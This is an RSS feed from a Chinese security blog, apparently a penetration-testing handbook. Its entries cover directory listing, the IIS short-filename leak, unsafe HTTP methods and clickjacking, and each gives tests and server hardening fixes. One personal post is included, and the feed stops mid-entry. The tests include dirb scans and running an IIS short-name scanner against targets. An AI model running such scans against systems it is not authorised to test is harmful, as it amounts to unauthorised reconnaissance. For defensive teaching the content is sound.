<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>倾旋的博客</title>
    <description>岁月静好，现世安稳。
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 27 Apr 2018 12:26:08 +0800</pubDate>
    <lastBuildDate>Fri, 27 Apr 2018 12:26:08 +0800</lastBuildDate>
    <generator>Jekyll v3.6.2</generator>
    
      <item>
        <title>服务器端目录遍历</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 服务器端目录遍历
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-服务器端目录遍历&quot;&gt;0x00 服务器端目录遍历&lt;/h2&gt;

&lt;h3 id=&quot;1什么是服务器端目录遍历&quot;&gt;1）什么是服务器端目录遍历&lt;/h3&gt;

&lt;p&gt;当客户端访问到一个目录时，Web服务中间件将会默认寻找一个&lt;code class=&quot;highlighter-rouge&quot;&gt;index list&lt;/code&gt;中的文件，若文件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。&lt;/p&gt;

&lt;h3 id=&quot;2服务器端目录遍历的特点&quot;&gt;2）服务器端目录遍历的特点&lt;/h3&gt;

&lt;p&gt;中间件配置不得当&lt;/p&gt;

&lt;h2 id=&quot;0x01-服务器端目录遍历---风险等级&quot;&gt;0x01 服务器端目录遍历 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-服务器端目录遍历---原理&quot;&gt;0x02 服务器端目录遍历 - 原理&lt;/h2&gt;

&lt;p&gt;当客户端访问到一个目录时，Web服务中间件将会默认寻找一个&lt;code class=&quot;highlighter-rouge&quot;&gt;index list&lt;/code&gt;中的文件，若文件不存在，则会列出当前目录下所有文件或返回403状态码。&lt;/p&gt;

&lt;h2 id=&quot;0x03-服务器端目录遍历---常见场景&quot;&gt;0x03 服务器端目录遍历 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Tomcat&lt;/li&gt;
  &lt;li&gt;Nginx&lt;/li&gt;
  &lt;li&gt;Apache&lt;/li&gt;
  &lt;li&gt;IIS&lt;/li&gt;
  &lt;li&gt;… 均有此类现象&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;先使用dirb扫描一些存在的目录，再使用浏览器访问已存在的目录，查看是否能够列出目录下的文件&lt;/p&gt;

&lt;p&gt;命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;dirb http://target&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-27/0x02.gif&quot; alt=&quot;0x02&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;h4 id=&quot;apache&quot;&gt;Apache&lt;/h4&gt;

&lt;h5 id=&quot;修改站点目录对应的配置文件&quot;&gt;修改站点目录对应的配置文件&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x00.png&quot; alt=&quot;列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Directory /&amp;gt;
    Options +Indexes +FollowSymLinks # 将 &quot;+&quot; 与 Indexes 去掉即可限制列出目录索引
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
&amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改后：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Directory /&amp;gt;
    Options FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
&amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x01.png&quot; alt=&quot;不列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;创建directoryindex默认文件&quot;&gt;创建DirectoryIndex默认文件&lt;/h5&gt;

&lt;p&gt;大家都见过很多框架的每个目录都有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;index.html&lt;/code&gt;文件，这个文件的存在是非常有意义的，很多线上的Web服务器都没有合格配置&lt;code class=&quot;highlighter-rouge&quot;&gt;列出目录索引&lt;/code&gt;。导致网站内部许多文件都被攻击者查看到，泄漏大量信息。&lt;/p&gt;

&lt;p&gt;为了防止列出目录索引，我们可以在站点的每个文件夹中创建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;index.html&lt;/code&gt;，这个文件内容是什么都无所谓了。当攻击者想通过列目录的手法访问你站点文件夹的时候，Web服务器将会判断当前目录下有没有&lt;code class=&quot;highlighter-rouge&quot;&gt;DirectoryIndex&lt;/code&gt;默认首页，如果存在就显示&lt;code class=&quot;highlighter-rouge&quot;&gt;DirectoryIndex&lt;/code&gt;对应的文件名的内容，这样攻击者就无法查看该目录下有什么文件了。&lt;/p&gt;

&lt;h4 id=&quot;tomcat&quot;&gt;Tomcat&lt;/h4&gt;

&lt;h5 id=&quot;修改confwebxml配置文件&quot;&gt;修改conf/web.xml配置文件&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x02.png&quot; alt=&quot;列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;listings&amp;lt;/param-name&amp;gt; 
            &amp;lt;param-value&amp;gt;true&amp;lt;/param-value&amp;gt; &amp;lt;!-- 将true改为false --&amp;gt;
&amp;lt;/init-param&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改后：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;init-param&amp;gt;
            &amp;lt;param-name&amp;gt;listings&amp;lt;/param-name&amp;gt; 
            &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;
&amp;lt;/init-param&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x03.png&quot; alt=&quot;不列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;nginx&quot;&gt;Nginx&lt;/h4&gt;

&lt;h5 id=&quot;修改confnginxconf配置文件&quot;&gt;修改conf/nginx.conf配置文件&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x05.png&quot; alt=&quot;列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;location / {
            index  index.html index.htm index.php l.php;
           autoindex on;  
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改后：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;location / {
            index  index.html index.htm index.php l.php;
           autoindex off;  
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x04.png&quot; alt=&quot;不列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;iis&quot;&gt;IIS&lt;/h4&gt;

&lt;h4 id=&quot;设置目录浏览权限&quot;&gt;设置”目录浏览”权限&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x06.png&quot; alt=&quot;列出目录索引&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x08.png&quot; alt=&quot;设置目录索引&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-11-15/0x07.png&quot; alt=&quot;不列出目录索引&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 27 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-27/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-27/1</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>IIS短文件名漏洞</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- IIS短文件名漏洞
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-iis短文件名漏洞&quot;&gt;0x00 IIS短文件名漏洞&lt;/h2&gt;

&lt;h3 id=&quot;1什么是iis短文件名漏洞&quot;&gt;1）什么是IIS短文件名漏洞&lt;/h3&gt;

&lt;p&gt;IIS短文件名是一个Windows系统为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。当这种特性被IIS中间件继承后，我们就可以使用短文件名进行目录猜解。&lt;/p&gt;

&lt;h3 id=&quot;2iis短文件名漏洞的特点&quot;&gt;2）IIS短文件名漏洞的特点&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;利用难度低&lt;/li&gt;
  &lt;li&gt;会产生很多请求&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01-iis短文件名漏洞---风险等级&quot;&gt;0x01 IIS短文件名漏洞 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;低&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-iis短文件名漏洞---原理&quot;&gt;0x02 IIS短文件名漏洞 - 原理&lt;/h2&gt;

&lt;p&gt;当我们访问一个长名称目录的时候：&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.1.1/administrator&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个&lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt;目录可以根据Windows 8.3格式简写为&lt;code class=&quot;highlighter-rouge&quot;&gt;admini~1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根据这个上述格式，我们访问&lt;code class=&quot;highlighter-rouge&quot;&gt;/admini~1&lt;/code&gt;也可以相当于访问&lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x03-服务器端目录遍历---常见场景&quot;&gt;0x03 服务器端目录遍历 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;IIS 中间件&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;h3 id=&quot;方案一&quot;&gt;方案一&lt;/h3&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;IIS_shortname_Scanner&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;命令：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;git clone https://github.com/lijiejie/IIS_shortname_Scanner.git&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;cd IIS_shortname_Scanner&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;python iis_shortname_Scan.py http://target&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-27/0x02.png&quot; alt=&quot;0x02&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;方案二需服务器权限&quot;&gt;方案二（需服务器权限）&lt;/h3&gt;

&lt;p&gt;执行命令（管理员权限）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem\ /v &quot;NtfsDisable8dot3NameCreation&quot;

-----------------------------------------------------------------
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem
    NtfsDisable8dot3NameCreation    REG_DWORD    0x0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若&lt;code class=&quot;highlighter-rouge&quot;&gt;NtfsDisable8dot3NameCreation&lt;/code&gt;是&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt;，存在此漏洞&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;p&gt;执行命令（管理员权限）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem\ /
v &quot;NtfsDisable8dot3NameCreation&quot; /t REG_DWORD /d 1 /f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重启服务器&lt;/p&gt;
</description>
        <pubDate>Fri, 27 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-27/2</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-27/2</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>新生活 - 上海，我来了</title>
        <description>&lt;!--more--&gt;

&lt;p&gt;完成了一个梦想，真好，转眼间逝去的两年，我不断成长，感受人情冷暖、接纳新鲜事物，至今已学会如何照顾自己，让生活更具有色彩，人生更加无憾。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;谢谢我的朋友们给我的支持！&lt;/p&gt;

</description>
        <pubDate>Fri, 20 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-20/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-20/1</guid>
        
        
        <category>生活</category>
        
      </item>
    
      <item>
        <title>服务器启用了不安全的HTTP方法</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 服务器启用了不安全的HTTP方法
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-不安全的http方法&quot;&gt;0x00 不安全的HTTP方法&lt;/h2&gt;

&lt;h3 id=&quot;1什么是不安全的http方法&quot;&gt;1）什么是不安全的HTTP方法&lt;/h3&gt;

&lt;p&gt;开发人员、运维人员一般可能用于调试服务器，开启了一些客户端能够直接读写服务器端文件的方法，例如： DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK 等HTTP协议支持的方法。&lt;/p&gt;

&lt;h3 id=&quot;2不安全的http方法特点&quot;&gt;2）不安全的HTTP方法特点&lt;/h3&gt;

&lt;p&gt;可通过浏览器直接读写服务器端文件&lt;/p&gt;

&lt;h2 id=&quot;0x01-不安全的http方法---风险等级&quot;&gt;0x01 不安全的HTTP方法 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-不安全的http方法---原理&quot;&gt;0x02 不安全的HTTP方法 - 原理&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;方法&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;PUT&lt;/td&gt;
      &lt;td&gt;向指定的目录上载文件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DELETE&lt;/td&gt;
      &lt;td&gt;删除指定的资源&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;COPY&lt;/td&gt;
      &lt;td&gt;将指定的资源复制到Destination消息头指定的位置&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MOVE&lt;/td&gt;
      &lt;td&gt;将指定的资源移动到Destination消息头指定的位置&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SEARCH&lt;/td&gt;
      &lt;td&gt;在一个目录路径中搜索资源&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PROPFIND&lt;/td&gt;
      &lt;td&gt;获取与指定资源有关的信息，如作者、大小与内容类型&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;TRACE&lt;/td&gt;
      &lt;td&gt;在响应中返回服务器收到的原始请求&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;服务器端由于配置权限不当，导致允许了客户端发送 DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK等请求，并且解析请求进行操作文件。&lt;/p&gt;

&lt;h2 id=&quot;0x03-不安全的http方法---常见场景&quot;&gt;0x03 不安全的HTTP方法 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Tomcat 中间件&lt;/li&gt;
  &lt;li&gt;IIS 中间件&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用CURL发送OPTIONS请求，查看响应头中的Allow行&lt;/p&gt;

&lt;p&gt;命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -I -X OPTIONS http://payloads.online&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ curl -I -X OPTIONS http://10.211.55.16/
HTTP/1.1 200 OK
Date: Wed, 18 Apr 2018 02:17:47 GMT
Server: Microsoft-IIS/6.0
MS-Author-Via: DAV
Content-Length: 0
Accept-Ranges: none
DASL: &amp;lt;DAV:sql&amp;gt;
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若出现PUT、DELETE….等方法，则存在此风险&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-18/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;

&lt;p&gt;修改站点权限，取消“写入”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-18/0x01.gif&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tomcat&quot;&gt;Tomcat&lt;/h3&gt;

&lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;web.xml&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;security-constraint&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;web-resource-collection&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;web-resource-name&amp;gt;&lt;/span&gt;fortune&lt;span class=&quot;nt&quot;&gt;&amp;lt;/web-resource-name&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;PUT&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;DELETE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;HEAD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;OPTIONS&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;http-method&amp;gt;&lt;/span&gt;TRACE&lt;span class=&quot;nt&quot;&gt;&amp;lt;/http-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/web-resource-collection&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;auth-constraint&amp;gt;&amp;lt;/auth-constraint&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/security-constraint&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;login-config&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;auth-method&amp;gt;&lt;/span&gt;BASIC&lt;span class=&quot;nt&quot;&gt;&amp;lt;/auth-method&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/login-config&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;

&lt;p&gt;在 &lt;code class=&quot;highlighter-rouge&quot;&gt;server&lt;/code&gt;代码块内写入如下代码，用于屏蔽非GET、POST请求：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ($request_method !~* GET|POST) {
            return 403;

   }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Wed, 18 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-18/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-18/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>点击劫持：X-Frame-Options头丢失</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 点击劫持：X-Frame-Options头丢失
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-点击劫持x-frame-options头丢失---介绍&quot;&gt;0x00 点击劫持：X-Frame-Options头丢失 - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是点击劫持x-frame-options头丢失&quot;&gt;1）什么是点击劫持：X-Frame-Options头丢失&lt;/h3&gt;

&lt;p&gt;X-Frame-Options HTTP 响应头， 可以指示浏览器是否应该加载一个 iframe 中的页面。 网站可以通过设置 X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持。&lt;/p&gt;

&lt;h3 id=&quot;2点击劫持x-frame-options头丢失的特点&quot;&gt;2）点击劫持：X-Frame-Options头丢失的特点&lt;/h3&gt;

&lt;p&gt;属于一种具有迷惑性高、利用难度中等、攻击方式单一的攻击手法。&lt;/p&gt;

&lt;h2 id=&quot;0x01-点击劫持x-frame-options头丢失---风险等级&quot;&gt;0x01 点击劫持：X-Frame-Options头丢失 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-点击劫持x-frame-options头丢失---原理&quot;&gt;0x02 点击劫持：X-Frame-Options头丢失 - 原理&lt;/h2&gt;

&lt;p&gt;当X-Frame-Options HTTP 响应头丢失的时候，攻击者可以伪造一个页面，该页面使用前端技术精心构造一些诱惑用户点击的按钮、图片，该元素下方就是一个iframe标签，当用户点击后上层的元素后，就相当于点击了iframe标签引入的网页页面。&lt;/p&gt;

&lt;h2 id=&quot;0x03-点击劫持x-frame-options头丢失---常见场景&quot;&gt;0x03 点击劫持：X-Frame-Options头丢失 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;默认配置的WebServer&lt;/li&gt;
  &lt;li&gt;单一交互的网站（按钮）&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用CURL请求网站，查看响应头是否包含&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -I http://target
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;未修复&quot;&gt;未修复&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
HTTP/1.1 200 OK
Server: nginx/1.12.1 (Ubuntu)
Date: Mon, 16 Apr 2018 07:48:51 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
Connection: keep-alive
ETag: &quot;5ac98168-264&quot;
Accept-Ranges: bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不存在&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头。&lt;/p&gt;

&lt;h3 id=&quot;修复后&quot;&gt;修复后&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;payloads@Online$ curl -I http://localhost
HTTP/1.1 200 OK
Server: nginx/1.12.1 (Ubuntu)
Date: Mon, 16 Apr 2018 07:52:08 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Sun, 08 Apr 2018 02:41:44 GMT
Connection: keep-alive
ETag: &quot;5ac98168-264&quot;
X-Frame-Options: SAMEORIGIN
Accept-Ranges: bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;p&gt;配置WebServer，更改配置文件，添加自定义响应头&lt;/p&gt;

&lt;p&gt;使用 X-Frame-Options 有三个可选的值：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DENY：浏览器拒绝当前页面加载任何Frame页面&lt;/li&gt;
  &lt;li&gt;SAMEORIGIN：frame页面的地址只能为同源域名下的页面&lt;/li&gt;
  &lt;li&gt;ALLOW-FROM：origin为允许frame加载的页面地址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若网站内有使用iframe标签链接同源资源的，需要设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;SAMEORIGIN&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;

&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; 在所有页面上发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，需要把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;site&lt;/code&gt; 的配置中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Header always append X-Frame-Options SAMEORIGIN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;

